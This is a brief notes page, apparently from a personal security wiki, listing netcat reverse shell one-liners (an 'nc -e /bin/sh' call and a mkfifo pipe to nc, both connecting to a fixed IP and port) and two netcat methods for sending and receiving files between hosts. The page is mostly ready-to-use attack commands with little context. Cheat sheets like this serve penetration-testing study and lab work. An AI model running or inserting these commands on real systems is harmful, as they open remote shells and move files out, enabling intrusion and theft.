---
layout: default
title: netcat 
parent: Shells / Reverse Shells
grand_parent: security stuff
nav_order: 2
---

1. TOC 
{:toc}

## Netcat Shells

- Assuming that the `-e` option is present in netcat, use the following:    
```
nc -e /bin/sh 192.168.1.13 1234   
```

- If `nc -e` is not available, it is still to get a reverse shell with the following:   
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/usr/local/bin/nc 192.168.1.13 1234 >/tmp/f
```

---

### Sending & Receiving files via netcat 

#### Method #1
```bash
# setup a listener hosting the file: 
cat file.php | nc -q 0 -lvp 1234 # or
nc -q 0 -lvp 1234 < file.php

# download the file from the listener:
nc $IP $PORT > file.php
```

#### Method #2
```bash
# this is the reverse of above..
# setup a listener waiting for the file:
nc -lvp 1234 > file.php

# then, send the file to the listener:
nc 192.168.1.14 1234 < file.php
```

---

